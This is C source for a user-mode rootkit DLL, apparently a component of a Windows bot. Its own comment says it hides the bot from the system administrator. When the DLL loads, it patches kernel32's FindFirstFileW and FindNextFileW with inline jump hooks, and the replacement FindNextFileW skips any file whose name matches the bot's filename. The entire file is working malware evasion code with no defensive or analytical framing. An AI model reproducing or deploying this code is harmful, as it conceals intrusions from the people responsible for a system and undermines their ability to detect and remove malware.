/* Rootkit will hide the bots process from the sysadmin. */
/* Only ring3 but does the job, Is also unworking on Vista. */

#include "../h/includes.h"
#include "../h/externs.h"

BYTE *BufferFF;
BYTE *BufferFN;
HANDLE  __stdcall miFindFirstFileW(LPCTSTR lpFileName,LPWIN32_FIND_DATAW lpFindFileData);
HANDLE (__stdcall *pBuffFF) (LPCTSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
HANDLE  __stdcall miFindNextFileW(HANDLE hFindFile,LPWIN32_FIND_DATAW lpFindFileData); 
HANDLE (__stdcall *pBuffFN) (HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);

bool WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		Hookear();
	}
	return TRUE;
}

HANDLE  __stdcall miFindFirstFileW(LPCTSTR lpFileName,LPWIN32_FIND_DATAW lpFindFileData)
{
	HANDLE hand = pBuffFF(lpFileName,lpFindFileData);
	return hand;
}
HANDLE  __stdcall miFindNextFileW(HANDLE hFindFile,LPWIN32_FIND_DATAW lpFindFileData)
{
	HANDLE hand;
	char ascStr[611];
	do
	{
		hand = pBuffFN(hFindFile,lpFindFileData);
		WideCharToMultiByte(CP_ACP, 0, lpFindFileData->cFileName, -1, ascStr, 611, NULL, NULL);
	}while (strncmp(ascStr,filename,strlen(filename)) == 0 && hand != NULL);
	return hand;
}

void Hookear()
{
	DWORD ProteVieja;
	BYTE  *DirFN;
	BYTE  *DirYoFN;
	BYTE  *DirFF;
	BYTE  *DirYoFF;
	DirFF=(BYTE *) GetProcAddress(GetModuleHandle("kernel32.dll"), "FindFirstFileW");
	BufferFF=(BYTE *) malloc (12);
	VirtualProtect((void *) BufferFF, 12, PAGE_EXECUTE_READWRITE, &ProteVieja);
	memcpy(BufferFF,DirFF,7);
	BufferFF += 7;
	*BufferFF=0xE9;
	BufferFF++;
	*((signed int *) BufferFF)= DirFF - BufferFF + 3;
	pBuffFF = (HANDLE (__stdcall *)(LPCTSTR,LPWIN32_FIND_DATAW)) (BufferFF-8);
	VirtualProtect((void *) DirFF,5,PAGE_EXECUTE_READWRITE,&ProteVieja);
	DirYoFF=(BYTE *) miFindFirstFileW;
	*DirFF=0xE9;
	DirFF++;
	*((signed int *) DirFF)=DirYoFF - DirFF - 4;
	DirFN=(BYTE *) GetProcAddress(GetModuleHandle("kernel32.dll"), "FindNextFileW");
	BufferFN=(BYTE *) malloc (12);
	VirtualProtect((void *) BufferFN, 12, PAGE_EXECUTE_READWRITE, &ProteVieja);
	memcpy(BufferFN,DirFN,7);
	BufferFN += 7;
	*BufferFN=0xE9;
	BufferFN++;
	*((signed int *) BufferFN)= DirFN - BufferFN + 3;
	pBuffFN = (HANDLE (__stdcall *)(HANDLE,LPWIN32_FIND_DATAW)) (BufferFN-8);
	VirtualProtect((void *) DirFN,5,PAGE_EXECUTE_READWRITE,&ProteVieja);
	DirYoFN=(BYTE *) miFindNextFileW;
	*DirFN=0xE9;
	DirFN++;
	*((signed int *) DirFN)=DirYoFN - DirFN - 4;
	FlushInstructionCache(GetCurrentProcess(),NULL,NULL);
}
